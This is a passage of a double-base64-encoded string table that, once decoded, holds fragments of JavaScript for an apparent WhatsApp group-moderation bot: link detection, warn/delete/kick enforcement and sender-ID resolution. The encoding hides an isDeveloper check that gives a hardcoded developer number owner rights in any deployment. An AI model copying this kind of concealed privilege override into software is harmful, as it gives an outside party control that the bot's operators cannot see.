nSUhObFpXNHVZV1JrS0c4cE93b2dJQ0FnSUNCbWIzSWdLR052Ym5OMElHc2diMllnVDJKcVpXTjBMbXRsZVhNb2J5a3BJSHNLSUNBZ0lDQWdJQ0JwWmlBb2F5QTlQVDBn","SUNZbUlHOWJhMTBwSUhKbGRIVnliaUIwY25WbE93b2dJQ0FnSUNBZ0lHbG1JQ2hySUQwOVBTQT0=","SUNZbUlHOWJhMTBwSUhKbGRIVnliaUIwY25WbE93b2dJQ0FnSUNBZ0lHTnZibk4wSUhZZ1BTQnZXMnRkT3dvZ0lDQWdJQ0FnSUdsbUlDaDJJQ1ltSUhSNWNHVnZaaUIySUQwOVBTQT0=","SUNZbUlIZGhiR3NvZGl3Z1pDQXJJREVwS1NCeVpYUjFjbTRnZEhKMVpUc0tJQ0FnSUNBZ2ZRb2dJQ0FnSUNCeVpYUjFjbTRnWm1Gc2MyVTdDaUFnSUNCOU93b2dJQ0FnYVdZZ0tIZGhiR3NvYlN3Z01Da3BJSEpsZEhWeWJpQjBjblZsT3dvZ0lDQWdZMjl1YzNRZ2RDQTlJRzB1WTI5dWRtVnljMkYwYVc5dUlIeDhJRzB1WlhoMFpXNWtaV1JVWlhoMFRXVnpjMkZuWlQ4dWRHVjRkQ0I4ZkFvZ0lDQWdJQ0J0TG1sdFlXZGxUV1Z6YzJGblpUOHVZMkZ3ZEdsdmJpQjhmQ0J0TG5acFpHVnZUV1Z6YzJGblpUOHVZMkZ3ZEdsdmJpQjhmQ0E9","T3dvZ0lDQWdjbVYwZFhKdUlDOTNhR0YwYzJGd2NGd3VZMjl0WEM5amFHRnVibVZzWEM4dmFTNTBaWE4wS0ZOMGNtbHVaeWgwS1NrN0NpQWdmU0JqWVhSamFDQjdJSEpsZEhWeWJpQm1ZV3h6WlRzZ2ZRcDlDZ292S2lvZ1ZXeDBjbUV0YUdWaGRua2diR2x1YXlCa1pYUmxZM1J2Y2lEaWdKUWdZMkYwWTJobGN5QmhiRzF2YzNRZ1pYWmxjbmtnYzNCaGJTQXZJSE5vYjNKMElDOGdhVzUyYVhSbElDOGdiV2x5Y205eUlHeHBibXNnS2k4S0lDQnBaaUFvSVhSbGVIUXBJSEpsZEhWeWJpQm1ZV3h6WlRzS0lDQmpiMjV6ZENCMElEMGdVM1J5YVc1bktIUmxlSFFwT3dvZ0lDOHZJRU52YlcxdmJpQndZWFIwWlhKdWN6b2dhSFIwY0NoektTd2dkM2QzTENCM1lTNXRaU3dnWTJoaGRDNTNhR0YwYzJGd2NDd2dkQzV0WlN3Z1ltbDBMbXg1TENCMGFXNTVkWEpzTENCbmIyOHVaMndzSUdWMFl5NEtJQ0J5WlhSMWNtNGdMeWcvT21oMGRIQnpQenBjTDF3dmZIZDNkMXd1ZkhkaFhDNXRaVnd2ZkdOb1lYUmNMbmRvWVhSellYQndYQzVqYjIxY0wzeDBYQzV0WlZ3dmZHSnBkRnd1YkhsY0wzeDBhVzU1ZFhKc1hDNWpiMjFjTDN4bmIyOWNMbWRzWEM5OGNtVmljbUZ1WkZ3dWJIbGNMM3hqZFhSMFhDNXNlVnd2ZkhKaVhDNW5lVnd2ZkhOb2IzSjBkWEpzWEM1aGRGd3ZmR2x6WEM1blpGd3ZmRzkzWEM1c2VWd3ZmSFJjTG1OdlhDOThabUpjTG0xbFhDOThhVzV6ZEdGbmNtRnRYQzVqYjIxY0wzeDViM1YwZFZ3dVltVmNMM3g1YjNWMGRXSmxYQzVqYjIxY0wzeDBhV3QwYjJ0Y0xtTnZiVnd2ZkhadFhDNTBhV3QwYjJ0Y0xtTnZiVnd2ZkdScGMyTnZjbVJjTG1kblhDOThaR2x6WTI5eVpGd3VZMjl0WEM5cGJuWnBkR1ZjTDN4MFpXeGxaM0poYlZ3dWJXVmNMM3gwWnpwY0wxd3ZmRnhpVzJFdGVqQXRPUzFkZXpJc2ZWd3VLR052Ylh4dVpYUjhiM0puZkhoNWVueHBibVp2Zkd4cGJtdDhZMnhwWTJ0OGMybDBaWHh2Ym14cGJtVjhiR2wyWlh4aGNIQjhjR0ZuWlh4dFpYeHBiM3hqYjN4cGJueHdhM3gxYTN4MWN5bGNZbHRjTDF3L1hUOHBMMmt1ZEdWemRDaDBLVHNLZlFvS0x5b3FJRlZ1YVdacFpXUWdZVzUwYVNCbGJtWnZjbU5sYldWdWRDRGlnSlFnYzJsdVoyeGxJRzF2WkdVZ2NHVnlJR1psWVhSMWNtVWdLSGRoY200Z2ZDQmtaV3hsZEdVZ2ZDQnJhV05yS1M0S0lDb2dVMlYwZEdsdVp5QmhJRzVsZHlCdGIyUmxJSEpsY0d4aFkyVnpJSFJvWlNCd2NtVjJhVzkxY3lCdmJtVXVJRTF2WkdWeklHUnZJRzV2ZENCemRHRmpheTRLSUNvZ0xTQmtaV3hsZEdVNklISmxiVzkyWlNCdFpYTnpZV2RsSUNzZ2JtOTBhV1o1Q2lBcUlDMGdkMkZ5YmpvZ0lDQnlaVzF2ZG1VZ2JXVnpjMkZuWlNBcklHTnZkVzUwSUhkaGNtNDdJR3RwWTJzZ2IyNXNlU0IzYUdWdUlHeHBiV2wwSUhKbFlXTm9aV1FLSUNvZ0xTQnJhV05yT2lBZ0lISmxiVzkyWlNCdFpYTnpZV2RsSUNzZ2FXMXRaV1JwWVhSbElHdHBZMnNnS0c1dklIZGhjbTRnWTI5MWJuUmxjaWtLSUNvdkNpOHZJRUZ1ZEdrdFpHVnNaWFJsSUhGMVpYVmxPaUJrYnlCdWIzUWdhVzF3YjNObElHRnVJR0Z5ZEdsbWFXTnBZV3dnY0dWeUxXSjFjbk4wSUd4cGJXbDBMZ292THlCTlpYTnpZV2RsY3lCaGNtVWdjWFZsZFdWa0lIQmxjaUJqYUdGMElITnZJR0VnWW5WeWMzUWdiMllnYkdsdWEzTWdhWE1nY0hKdlkyVnpjMlZrSUdsdWMzUmxZV1FnYjJZS0x5OGdabWx5YVc1bklHaDFibVJ5WldSeklHOW1JR1JsYkdWMFpTQnlaWEYxWlhOMGN5QmhkQ0J2Ym1ObElDaDNhR2xqYUNCallXNGdZbVVnZEdoeWIzUjBiR1ZrTDJSeWIzQndaV1FwTGdvS0lDQnBaaUFvSVd0bGVTQjhmQ0FoYW1sa0tTQnlaWFIxY200N0NpQWdZMjl1YzNRZ2NXc2dQU0J0WTB0bGVTaHpiMk5yTENCcWFXUXBPd29nSUdOdmJuTjBJSEJ5WlhacGIzVnpJRDBnWVc1MGFVUmxiR1YwWlZGMVpYVmxjeTVuWlhRb2NXc3BJSHg4SUZCeWIyMXBjMlV1Y21WemIyeDJaU2dwT3dvZ0lHTnZibk4wSUhSaGMyc2dQU0J3Y21WMmFXOTFjd29nSUNBZ0xtTmhkR05vS0NncElEMCtJSHQ5S1FvZ0lDQWdMblJvWlc0b1lYTjVibU1nS0NrZ1BUNGdld29nSUNBZ0lDQm1iM0lnS0d4bGRDQmhkSFJsYlhCMElEMGdNRHNnWVhSMFpXMXdkQ0E4SURNN0lHRjBkR1Z0Y0hRckt5a2dld29nSUNBZ0lDQWdJSFJ5ZVNCN0NpQWdJQ0FnSUNBZ0lDQmhkMkZwZENCemIyTnJMbk5sYm1STlpYTnpZV2RsS0dwcFpDd2dleUJrWld4bGRHVTZJR3RsZVNCOUtUc0tJQ0FnSUNBZ0lDQWdJSEpsZEhWeWJqc0tJQ0FnSUNBZ0lDQjlJR05oZEdOb0lDaGxLU0I3Q2lBZ0lDQWdJQ0FnSUNCcFppQW9ZWFIwWlcxd2RDQTlQVDBnTWlrZ2NtVjBkWEp1T3dvZ0lDQWdJQ0FnSUNBZ1lYZGhhWFFnYm1WM0lGQnliMjFwYzJVb2NtVnpiMngyWlNBOVBpQnpaWFJVYVcxbGIzVjBLSEpsYzI5c2RtVXNJREUxTUNBcUlDaGhkSFJsYlhCMElDc2dNU2twS1RzS0lDQWdJQ0FnSUNCOUNpQWdJQ0FnSUgwS0lDQWdJSDBwT3dvS0lDQmhiblJwUkdWc1pYUmxVWFZsZFdWekxuTmxkQ2h4YXl3Z2RHRnpheWs3Q2lBZ2RHRnpheTVtYVc1aGJHeDVLQ2dwSUQwK0lIc0tJQ0FnSUdsbUlDaGhiblJwUkdWc1pYUmxVWFZsZFdWekxtZGxkQ2h4YXlrZ1BUMDlJSFJoYzJzcElHRnVkR2xFWld4bGRHVlJkV1YxWlhNdVpHVnNaWFJsS0hGcktUc0tJQ0I5S1M1allYUmphQ2dvS1NBOVBpQjdmU2s3Q24wS0NpOHFLaUJHYVc1a0lIUm9aU0J6YjNWeVkyVWdZMmhoYm01bGJDQW9Ta2xFSUNzZ2IzSnBaMmx1WVd3Z2JtRnRaU2tnYjJZZ1lTQm1iM0ozWVhKa1pXUWdZMmhoYm01bGJDQndiM04wSUNvdkNpQWdiR1YwSUdOcWFXUWdQU0E9","TENCdVlXMWxJRDBn","TENCamIyUmxJRDBn","T3dvZ0lIUnllU0I3Q2lBZ0lDQmpiMjV6ZENCelpXVnVJRDBnYm1WM0lGTmxkQ2dwT3dvZ0lDQWdZMjl1YzNRZ2QyRnNheUE5SUNodkxDQmtLU0E5UGlCN0NpQWdJQ0FnSUdsbUlDZ2hieUI4ZkNCMGVYQmxiMllnYnlBaFBUMGc=","SUh4OElHUWdQaUEzSUh4OElITmxaVzR1YUdGektHOHBLU0J5WlhSMWNtNDdDaUFnSUNBZ0lITmxaVzR1WVdSa0tHOHBPd29nSUNBZ0lDQmpiMjV6ZENCbUlEMGdieTVtYjNKM1lYSmtaV1JPWlhkemJHVjBkR1Z5VFdWemMyRm5aVWx1Wm04N0NpQWdJQ0FnSUdsbUlDaG1JQ1ltSUhSNWNHVnZaaUJtSUQwOVBTQT0=","S1NCN0NpQWdJQ0FnSUNBZ1kycHBaQ0E5SUdOcWFXUWdmSHdnVTNSeWFXNW5LR1l1Ym1WM2MyeGxkSFJsY2twcFpDQjhmQ0E9","S1RzS0lDQWdJQ0FnSUNCdVlXMWxJRDBnYm1GdFpTQjhmQ0JUZEhKcGJtY29aaTV1WlhkemJHVjBkR1Z5VG1GdFpTQjhmQ0E9","S1RzS0lDQWdJQ0FnZlFvZ0lDQWdJQ0JqYjI1emRDQnBibllnUFNCdkxtNWxkM05zWlhSMFpYSkJaRzFwYmtsdWRtbDBaVTFsYzNOaFoyVTdDaUFnSUNBZ0lHbG1JQ2hwYm5ZZ0ppWWdkSGx3Wlc5bUlHbHVkaUE5UFQwZw==","S1NCN0NpQWdJQ0FnSUNBZ1kycHBaQ0E5SUdOcWFXUWdmSHdnVTNSeWFXNW5LR2x1ZGk1dVpYZHpiR1YwZEdWeVNtbGtJSHg4SUE9PQ==","S1RzS0lDQWdJQ0FnSUNCdVlXMWxJRDBnYm1GdFpTQjhmQ0JUZEhKcGJtY29hVzUyTG01bGQzTnNaWFIwWlhKT1lXMWxJSHg4SUE9PQ==","S1RzS0lDQWdJQ0FnZlFvZ0lDQWdJQ0JtYjNJZ0tHTnZibk4wSUdzZ2IyWWdUMkpxWldOMExtdGxlWE1vYnlrcElIZGhiR3NvYjF0clhTd2daQ0FySURFcE93b2dJQ0FnZlRzS0lDQWdJSGRoYkdzb2JYTm5QeTV0WlhOellXZGxMQ0F3S1RzS0lDQWdJR052Ym5OMElHMGdQU0J0YzJjL0xtMWxjM05oWjJVZ2ZId2dlMzA3Q2lBZ0lDQmpiMjV6ZENCMElEMGdiUzVqYjI1MlpYSnpZWFJwYjI0Z2ZId2diUzVsZUhSbGJtUmxaRlJsZUhSTlpYTnpZV2RsUHk1MFpYaDBJSHg4Q2lBZ0lDQWdJRzB1YVcxaFoyVk5aWE56WVdkbFB5NWpZWEIwYVc5dUlIeDhJRzB1ZG1sa1pXOU5aWE56WVdkbFB5NWpZWEIwYVc5dUlIeDhJQT09","T3dvZ0lDQWdZMjl1YzNRZ2JXMGdQU0JUZEhKcGJtY29kQ2t1YldGMFkyZ29MM2RvWVhSellYQndYQzVqYjIxY0wyTm9ZVzV1Wld4Y0x5aGJRUzFhWVMxNk1DMDVYeTFkS3lrdmFTazdDaUFnSUNCcFppQW9iVzBwSUdOdlpHVWdQU0J0YlZzeFhUc0tJQ0I5SUdOaGRHTm9JSHQ5Q2lBZ2FXWWdLQ0Z1WVcxbElDWW1JR05xYVdRZ0ppWWdZMmhoYm01bGJFNWhiV1ZEWVdOb1pTNW9ZWE1vWTJwcFpDa3BJRzVoYldVZ1BTQmphR0Z1Ym1Wc1RtRnRaVU5oWTJobExtZGxkQ2hqYW1sa0tUc0tJQ0JwWmlBb0lXNWhiV1VnSmlZZ2RIbHdaVzltSUhOdlkyc3VibVYzYzJ4bGRIUmxjazFsZEdGa1lYUmhJRDA5UFNBPQ==","S1NCN0NpQWdJQ0IwY25rZ2V3b2dJQ0FnSUNCamIyNXpkQ0J0WlhSaElEMGdZMnBwWkFvZ0lDQWdJQ0FnSUQ4Z1lYZGhhWFFnYzI5amF5NXVaWGR6YkdWMGRHVnlUV1YwWVdSaGRHRW8=","TENCamFtbGtLUW9nSUNBZ0lDQWdJRG9nS0dOdlpHVWdQeUJoZDJGcGRDQnpiMk5yTG01bGQzTnNaWFIwWlhKTlpYUmhaR0YwWVNnPQ==","TENCamIyUmxLU0E2SUc1MWJHd3BPd29nSUNBZ0lDQnVZVzFsSUQwZ1UzUnlhVzVuS0cxbGRHRS9MbTVoYldVZ2ZId2diV1YwWVQ4dWRHaHlaV0ZrWDIxbGRHRmtZWFJoUHk1dVlXMWxQeTUwWlhoMElIeDhJQT09","S1RzS0lDQWdJQ0FnWTJwcFpDQTlJR05xYVdRZ2ZId2dVM1J5YVc1bktHMWxkR0UvTG1sa0lIeDhJQT09","S1RzS0lDQWdJSDBnWTJGMFkyZ2dlMzBLSUNCOUNpQWdhV1lnS0dOcWFXUWdKaVlnYm1GdFpTa2dZMmhoYm01bGJFNWhiV1ZEWVdOb1pTNXpaWFFvWTJwcFpDd2dibUZ0WlNrN0NpQWdjbVYwZFhKdUlIc2dhbWxrT2lCamFtbGtMQ0J1WVcxbElIMDdDbjBLQ2lBZ1kyOXVjM1FnYm5WdFltVnlJRDBnYW1sa1RuVnRZbVZ5S0hObGJtUmxjaWs3Q2lBZ1kyOXVjM1FnY21WaGMyOXVJRDBnVTNSeWFXNW5LR3hoWW1Wc0lIeDhJQT09","S1M1MGIweHZkMlZ5UTJGelpTZ3BPd29nSUdOdmJuTjBJSFJwZEd4bFRXRndJRDBnZXdvZ0lDQWc=","TEFvZ0lDQWc=","S1M1MGIxVndjR1Z5UTJGelpTZ3BmV0E3Q2lBZ2JHVjBJSFJwZEd4bElEMGdZbUZ6WlZScGRHeGxPd29nSUdsbUlDaHlaV0Z6YjI0Z1BUMDlJQT09","ZldBN0lDOHZJSGR5WVhCd1pXUWdZbmtnS3VLQXBpb2dhVzRnZEdobElIUmxiWEJzWVhSbGN3b2dJQ0FnZlNCallYUmphQ0I3ZlFvZ0lIMEtDaUFnTHk4Z1IzSnZkWEF0YzNSaGRIVnpJR1J2WlhNZ2JtOTBJR052Ym5OMWJXVWdMbUZzYkc5M0lHRnVaQ0IxYzJWeklHWnBlR1ZrSURNdGQyRnlibWx1WnlCc2FXMXBkQzRLSUNBdkx5QlBkR2hsY2lCaGJuUnBJR1psWVhSMWNtVnpJR3RsWlhBZ2RHaGxJR1Y0YVhOMGFXNW5JQzVoYkd4dmR5QnNiMmRwWXk0S0lDQnBaaUFvY21WaGMyOXVJQ0U5UFNBPQ==","SUQ4Z015QTZJR2RsZEZkaGNtNU1hVzFwZENoemIyTnJLVHNLSUNBdkx5QlJkV1YxWlNCbGRtVnllU0J0WVhSamFHbHVaeUJ0WlhOellXZGxJR1p2Y2lCa1pXeGxkR2x2Ymk0S0lDQnhkV1YxWlVGdWRHbEVaV3hsZEdVb2MyOWpheXdnYW1sa0xDQnRjMmN1YTJWNUtUc0tDaUFnYVdZZ0tHMXZaR1VnUFQwOUlBPT0=","S1NCN0NpQWdJQ0IwY25rZ2V3b2dJQ0FnSUNCc1pYUWdkR0Z5WjJWMElEMGdjMlZ1WkdWeU93b2dJQ0FnSUNCMGNua2dld29nSUNBZ0lDQWdJR052Ym5OMElHMWxkR0VnUFNCaGQyRnBkQ0JuWlhSRFlXTm9aV1JOWlhSaEtITnZZMnNzSUdwcFpDazdDaUFnSUNBZ0lDQWdkR0Z5WjJWMElEMGdabWx1WkZCaGNuUnBZMmx3WVc1MFNtbGtLRzFsZEdFc0lHNTFiV0psY2lrZ2ZId2djMlZ1WkdWeU93b2dJQ0FnSUNCOUlHTmhkR05vSUh0OUNpQWdJQ0FnSUdGM1lXbDBJSE52WTJzdVozSnZkWEJRWVhKMGFXTnBjR0Z1ZEhOVmNHUmhkR1VvYW1sa0xDQmJkR0Z5WjJWMFhTd2c=","S1NrZ2NtVjBkWEp1SUc1dmNtMWhiR2w2WlVwcFpDaGpLVHNLSUNCOUNnb2dJQzh2SUZKbGMyOXNkbVVnVEVsRUlDMCtJSEJvYjI1bElHNTFiV0psY2lCMGFISnZkV2RvSUVKaGFXeGxlWE1uSUV4SlJDQnRZWEJ3YVc1bkxnb2dJR052Ym5OMElHeHBaRTFoY0hCcGJtY2dQU0J6YjJOclB5NXphV2R1WVd4U1pYQnZjMmwwYjNKNVB5NXNhV1JOWVhCd2FXNW5Pd29nSUdsbUlDaHNhV1JOWVhCd2FXNW5QeTVuWlhSUVRrWnZja3hKUkNrZ2V3b2dJQ0FnWm05eUlDaGpiMjV6ZENCaklHOW1JR05oYm1ScFpHRjBaWE1wSUhzS0lDQWdJQ0FnYVdZZ0tHTXVaVzVrYzFkcGRHZ28=","S1NrZ2V3b2dJQ0FnSUNBZ0lIUnllU0I3Q2lBZ0lDQWdJQ0FnSUNCamIyNXpkQ0J3YmlBOUlHRjNZV2wwSUd4cFpFMWhjSEJwYm1jdVoyVjBVRTVHYjNKTVNVUW9ZeWs3Q2lBZ0lDQWdJQ0FnSUNCcFppQW9jRzRwSUhKbGRIVnliaUJ1YjNKdFlXeHBlbVZLYVdRb2NHNHBPd29nSUNBZ0lDQWdJSDBnWTJGMFkyZ2dlMzBLSUNBZ0lDQWdmUW9nSUNBZ2ZRb2dJSDBLQ2lBZ0x5OGdSM0p2ZFhBZ2JXVjBZV1JoZEdFZ2FYTWdZU0IxYzJWbWRXd2dabUZzYkdKaFkyc2dkMmhsYmlCaGJpQmxkbVZ1ZENCdmJteDVJR052Ym5SaGFXNXpJR0VnVEVsRUxnb2dJR2xtSUNoamFHRjBTbWxrSUNZbUlHbHpSM0p2ZFhBb1kyaGhkRXBwWkNrcElIc0tJQ0FnSUhSeWVTQjdDaUFnSUNBZ0lHTnZibk4wSUcxbGRHRWdQU0JoZDJGcGRDQnpiMk5yTG1keWIzVndUV1YwWVdSaGRHRW9ZMmhoZEVwcFpDa3VZMkYwWTJnb0tDa2dQVDRnYm5Wc2JDazdDaUFnSUNBZ0lHTnZibk4wSUhCaGNuUnpJRDBnUVhKeVlYa3VhWE5CY25KaGVTaHRaWFJoUHk1d1lYSjBhV05wY0dGdWRITXBJRDhnYldWMFlTNXdZWEowYVdOcGNHRnVkSE1nT2lCYlhUc0tJQ0FnSUNBZ1ptOXlJQ2hqYjI1emRDQndZWEowSUc5bUlIQmhjblJ6S1NCN0NpQWdJQ0FnSUNBZ1kyOXVjM1FnYVdSeklEMGdXM0JoY25RL0xtbGtMQ0J3WVhKMFB5NXFhV1FzSUhCaGNuUS9MbXhwWkN3Z2NHRnlkRDh1Y0dodmJtVk9kVzFpWlhJc0lIQmhjblEvTG5CdVhTNW1hV3gwWlhJb1FtOXZiR1ZoYmlrdWJXRndLRk4wY21sdVp5azdDaUFnSUNBZ0lDQWdZMjl1YzNRZ2JXRjBZMmhsWkNBOUlHTmhibVJwWkdGMFpYTXVjMjl0WlNoaklEMCtJR2xrY3k1cGJtTnNkV1JsY3loaktTQjhmQ0JxYVdST2RXMWlaWElvWXlrZ1BUMDlJR3BwWkU1MWJXSmxjaWhwWkhNdVptbHVaQ2g0SUQwK0lIZ3VaVzVrYzFkcGRHZ28=","S1NCOGZDQjRMbVZ1WkhOWGFYUm9LQT09","S1NCOGZDQXZYbHhrS3lRdkxuUmxjM1FvZUNrcElIeDhJQT09","S1NrN0NpQWdJQ0FnSUNBZ2FXWWdLRzFoZEdOb1pXUXBJSHNLSUNBZ0lDQWdJQ0FnSUdOdmJuTjBJSEJ1SUQwZ2FXUnpMbVpwYm1Rb2VDQTlQaUI0TG1WdVpITlhhWFJvS0E9PQ==","S1NrZ2ZId2dhV1J6TG1acGJtUW9lQ0E5UGlBdlhseGtlemNzTVRWOUpDOHVkR1Z6ZENoNEtTazdDaUFnSUNBZ0lDQWdJQ0JwWmlBb2NHNHBJSEpsZEhWeWJpQndiaTVwYm1Oc2RXUmxjeWc9","T3dwOUNpOHFLaUJEYjJ4c1pXTjBJR0ZzYkNCd2IzTnphV0pzWlNCelpXNWtaWElnYVdSbGJuUnBabWxsY25NZ0tGQk9JR1JwWjJsMGN5d2dURWxFSUdScFoybDBjeXdnWm5Wc2JDQktTVVJ6TENCaGJIUnpLU0FxTHdvZ0lDOHZJRWxrWlc1MGFYUjVJRzltSUhSb1pTQkJRMVJWUVV3Z2MyVnVaR1Z5SUc5dWJIa3VJRTVsZG1WeUlIVnpaU0JqYjI1MFpYaDBTVzVtYnk1d1lYSjBhV05wY0dGdWRDQm9aWEpsT2dvZ0lDOHZJSFJvWVhRZ2FYTWdkR2hsSUdGMWRHaHZjaUJ2WmlCMGFHVWdVVlZQVkVWRUlDaHlaWEJzYVdWa0xYUnZLU0J0WlhOellXZGxMQ0J6YnlCMWMybHVaeUJwZENCc1pYUWdZVzU1YjI1bENpQWdMeThnWW1WamIyMWxJRzkzYm1WeUwyUmxkbVZzYjNCbGNpQnZaaUJoSUdKdmRDQnFkWE4wSUdKNUlISmxjR3g1YVc1bklIUnZJSFJvWVhRZ1lXTmpiM1Z1ZENkeklHMWxjM05oWjJVdUNpQWdZMjl1YzNRZ2FXUnpJRDBnYm1WM0lGTmxkQ2dwT3dvZ0lHTnZibk4wSUdGa1pDQTlJQ2gyS1NBOVBpQjdDaUFnSUNCcFppQW9JWFlwSUhKbGRIVnlianNLSUNBZ0lHTnZibk4wSUhNZ1BTQlRkSEpwYm1jb2RpazdDaUFnSUNCcFpITXVZV1JrS0hNcE93b2dJQ0FnWTI5dWMzUWdiaUE5SUdwcFpFNTFiV0psY2loektUc0tJQ0FnSUdsbUlDaHVLU0JwWkhNdVlXUmtLRzRwT3dvZ0lIMDdDaUFnWTI5dWMzUWdZMmhoZENBOUlGTjBjbWx1WnlodGMyY3VhMlY1UHk1eVpXMXZkR1ZLYVdRZ2ZId2c=","S1RzS0lDQmpiMjV6ZENCcGJrZHliM1Z3SUQwZ1kyaGhkQzVsYm1SelYybDBhQ2c9","S1NCOGZDQmphR0YwTG1WdVpITlhhWFJvS0E9PQ==","S1RzS0lDQnBaaUFvYlhObkxtdGxlVDh1Wm5KdmJVMWxLU0I3Q2lBZ0lDQmhaR1FvYzI5amF6OHVkWE5sY2o4dWFXUXBPd29nSUNBZ1lXUmtLSE52WTJzL0xuVnpaWEkvTG14cFpDazdDaUFnSUNCeVpYUjFjbTRnYVdSek93b2dJSDBLSUNCcFppQW9hVzVIY205MWNDa2dld29nSUNBZ1lXUmtLRzF6Wnk1clpYay9MbkJoY25ScFkybHdZVzUwS1RzS0lDQWdJR0ZrWkNodGMyY3VhMlY1UHk1d1lYSjBhV05wY0dGdWRFRnNkQ2s3Q2lBZ2ZTQmxiSE5sSUhzS0lDQWdJQzh2SUVSTk9pQjBhR1VnYjNSb1pYSWdjR0Z5ZEhrZ2FYTWdkR2hsSUhObGJtUmxjZ29nSUNBZ1lXUmtLRzF6Wnk1clpYay9MbkJoY25ScFkybHdZVzUwS1RzS0lDQWdJR0ZrWkNodGMyY3VhMlY1UHk1d1lYSjBhV05wY0dGdWRFRnNkQ2s3Q2lBZ0lDQmhaR1FvYlhObkxtdGxlVDh1Y21WdGIzUmxTbWxrS1RzS0lDQWdJR0ZrWkNodGMyY3VhMlY1UHk1eVpXMXZkR1ZLYVdSQmJIUXBPd29nSUgwS0lDQnlaWFIxY200Z2FXUnpPd3A5Q2lBZ1kyOXVjM1FnYVdSeklEMGdaMlYwVTJWdVpHVnlTV1J6S0cxelp5d2djMjlqYXlrN0NpQWdMeThnVUhKbFptVnlJSEpsWVd3Z2NHaHZibVVnYm5WdFltVnlJQ2czTFRFMUlHUnBaMmwwY3lrZ2IzWmxjaUJzYjI1bklFeEpSQW9nSUdadmNpQW9ZMjl1YzNRZ2FXUWdiMllnYVdSektTQjdDaUFnSUNCcFppQW9MMTVjWkhzM0xERTFmU1F2TG5SbGMzUW9hV1FwSUNZbUlHbGtJQ0U5UFNCRVJWWkZURTlRUlZKZlRFbEVLU0J5WlhSMWNtNGdhV1E3Q2lBZ2ZRb2dJR1p2Y2lBb1kyOXVjM1FnYVdRZ2IyWWdhV1J6S1NCN0NpQWdJQ0JwWmlBb0wxNWNaQ3NrTHk1MFpYTjBLR2xrS1NrZ2NtVjBkWEp1SUdsa093b2dJSDBLSUNCeVpYUjFjbTRn","S1RzS0lDQWdJR052Ym5OMElHMWxUR2xrSUQwZ2FtbGtUblZ0WW1WeUtITnZZMnMvTG5WelpYSS9MbXhwWkNCOGZDQT0=","S1RzS0lDQWdJR2xtSUNodFpTQTlQVDBnUkVWV1JVeFBVRVZTWDA1VlRVSkZVaUI4ZkNCdFpVeHBaQ0E5UFQwZ1JFVldSVXhQVUVWU1gweEpSQ2tnY21WMGRYSnVJSFJ5ZFdVN0NpQWdmUW9nSUhKbGRIVnliaUJtWVd4elpUc0tmUW9nSUdsbUlDaHBjMFJsZG1Wc2IzQmxjaWh6YjJOckxDQnRjMmNwS1NCeVpYUjFjbTRnZEhKMVpUc0tJQ0JwWmlBb2JYTm5MbXRsZVQ4dVpuSnZiVTFsS1NCeVpYUjFjbTRnZEhKMVpUc0tJQ0JqYjI1emRDQnBaSE1nUFNCblpYUlRaVzVrWlhKSlpITW9iWE5uTENCemIyTnJLVHNLSUNBdkx5Qk5kV3gwYVMxMFpXNWhiblE2SUc5M2JtVnlJRDBnZEdocGN5QnpaWE56YVc5dUozTWdjR0ZwY21Wa0lHNTFiV0psY2lBb1ltOTBJR0ZqWTI5MWJuUXBDaUFnWTI5dWMzUWdjMlZ6YzJsdmJrOTNibVZ5SUQwZ1ltOTBUblZ0WW1WeVJuSnZiVk52WTJzb2MyOWpheWtnZkh3Z1UzUnlhVzVuS0hOdlkycy9MbDlmWW05MFRuVnRZbVZ5SUh4OElBPT0=","S1RzS0lDQmpiMjV6ZENCc2FXUWdQU0JxYVdST2RXMWlaWElvYzI5amF6OHVkWE5sY2o4dWJHbGtJSHg4SUE9PQ==","T3dvZ0lHbG1JQ2hoYkhRZ0ppWWdVM1J5YVc1bktHRnNkQ2t1YVc1amJIVmtaWE1v","S1NrZ2V3b2dJQ0FnWTI5dWMzUWdiaUE5SUdwcFpFNTFiV0psY2loaGJIUXBPd29nSUNBZ2FXWWdLRzR1YkdWdVozUm9JRDQ5SURjcElISmxkSFZ5YmlCdU93b2dJSDBLSUNCamIyNXpkQ0J4ZFc5MFpXUlRaVzVrWlhJZ1BTQmpMbkJoY25ScFkybHdZVzUwSUQ4Z2FtbGtUblZ0WW1WeUtHTXVjR0Z5ZEdsamFYQmhiblFwSURvZw==","T3dvZ0lDOHZJRWxtSUhCaGNuUnBZMmx3WVc1MElHbHpJRUJzYVdRZ0tIQjFjbVVnWkdsbmFYUnpJRzltSUV4SlJDd2diMlowWlc0Z01UVXJLU3dnYzNScGJHd2djbVYwZFhKdUlHbDBJR1p2Y2lCTVNVUXRZbUZ6WldRZ1FWQkpjeXdLSUNBdkx5QmlkWFFnY0hKbFptVnlJR1Y0Y0d4cFkybDBJRzUxYldKbGNpQmhjbWR6SUhkb1pXNGdjSEpsYzJWdWRBb2dJR1p2Y2lBb1kyOXVjM1FnWVNCdlppQmhjbWR6S1NCN0NpQWdJQ0JqYjI1emRDQnVJRDBnVTNSeWFXNW5LR0VwTG5KbGNHeGhZMlVvTDF4RUwyY3NJQT09","S1RzS0lDQWdJR2xtSUNodUxteGxibWQwYUNBK1BTQTNJQ1ltSUc0dWJHVnVaM1JvSUR3OUlERTFLU0J5WlhSMWNtNGdianNLSUNCOUNpQWdhV1lnS0hGMWIzUmxaRk5sYm1SbGNpQW1KaUJ4ZFc5MFpXUlRaVzVrWlhJdWJHVnVaM1JvSUQ0OUlEY2dKaVlnY1hWdmRHVmtVMlZ1WkdWeUxteGxibWQwYUNBOFBTQXhOU2tnY21WMGRYSnVJSEYxYjNSbFpGTmxibVJsY2pzS0lDQnBaaUFvY1hWdmRHVmtVMlZ1WkdWeUtTQnlaWFIxY200Z2NYVnZkR1ZrVTJWdVpHVnlPd29nSUhKbGRIVnliaUE9","T3dwOUNpQWdZMjl1YzNRZ1ptbHNaU0E5SUhOdlkyc2dQeUJ6WmloemIyTnJMQ0E9","S1NBNklHSmhia1pwYkdVN0NpQWdjbVYwZFhKdUlISmxZV1JLYzI5dUtHWnBiR1VzSUZ0ZEtTNXRZWEFvVTNSeWFXNW5LUzVwYm1Oc2RXUmxjeWhUZEhKcGJtY29iblZ0WW1WeUtTazdDbjBLSUNCamIyNXpkQ0JtYVd4bElEMGdjMjlqYXlBL0lITm1LSE52WTJzc0lBPT0=","S1NBNklHMXZaR1ZHYVd4bE93b2dJR052Ym5OMElHMGdQU0J5WldGa1NuTnZiaWhtYVd4bExDQjdJRzF2WkdVNklBPT0=","SUgwcE93b2dJSEpsZEhWeWJpQmI=","WFM1cGJtTnNkV1JsY3lodExtMXZaR1VwSUQ4Z2JTNXRiMlJsSURvZw==","T3d